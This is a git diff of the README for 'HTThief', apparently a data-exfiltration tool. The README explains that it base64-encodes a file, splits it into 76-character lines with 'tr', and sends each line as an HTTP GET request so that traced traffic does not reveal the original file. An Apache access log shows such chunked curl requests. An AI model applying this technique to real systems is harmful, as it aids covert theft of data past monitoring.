@@ -33,9 +33,9 @@ How HTThief works is based on two assumptions:
     ```
 By default base64 will generate strings of 76 characters with a nullbyte (which in ASCII is understood as a space) at the end, instead of a new line. 
 
-![h6](https://github.com/V1n1v131r4/HTThief/assets/1153876/3101f83d-7996-4175-b9f3-9674db554c8c)
+![h6](https://github.com/V1n1v131r4/HTThief/assets/1153876/4612fce1-19e5-4d74-90de-cb117e493545)
 
-HTThief takes advantage of this to replace these spaces with new lines by means of ```tr -s``` and send the HTTP GET of each line of the encoded file, that is, pieces of 76 characters.
+HTThief takes advantage of this to replace these spaces with new lines by means of ```tr -s``` and send the HTTP GET of each line of the encoded file, that is, pieces of 76 characters. 
 
 ```
 tr -s '[:space:]' '\n' < /tmp/ax0c.txt > /tmp/ax0d.txt
@@ -44,7 +44,14 @@ tr -s '[:space:]' '\n' < /tmp/ax0c.txt > /tmp/ax0d.txt
 That way, even if there is some soul that decodes during tracing, this piece of code could not be identified as the original file.
 
 ```
-tr -s '[:space:]' '\n' < /tmp/ax0c.txt > /tmp/ax0d.txt
+┌──(kali㉿kali)-[~/HTThief]
+└─$ cat /var/log/apache2/access.log
+ 
+127.0.0.1 - - [11/Aug/2023:08:51:38 -0400] "GET //9j/4QCKRXhpZgAATU0AKgAAAAgABQENAAIAAAAnAAAASgEaAAUAAAABAAAAcgEbAAUAAAABAAAA HTTP/1.1" 404 432 "-" "curl/7.88.1"
+127.0.0.1 - - [11/Aug/2023:08:51:38 -0400] "GET /egEoAAMAAAABAAIAAAITAAMAAAABAAEAAAAAAAA8P3BocCBwaHBpbmZvKCk7IF9faGFsdF9jb21w HTTP/1.1" 404 432 "-" "curl/7.88.1"
+127.0.0.1 - - [11/Aug/2023:08:51:38 -0400] "GET /aWxlcigpOyA/PgAAAAAASAAAAAEAAABIAAAAAf/bAIQAAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEB HTTP/1.1" 404 432 "-" "curl/7.88.1"
+127.0.0.1 - - [11/Aug/2023:08:51:38 -0400] "GET /AQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEB HTTP/1.1" 404 432 "-" "curl/7.88.1"
+127.0.0.1 - - [11/Aug/2023:08:51:38 -0400] "GET /AQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEB/8AAEQgDIAMg HTTP/1.1" 404 432 "-" "curl/7.88.1"
 ```
 
 
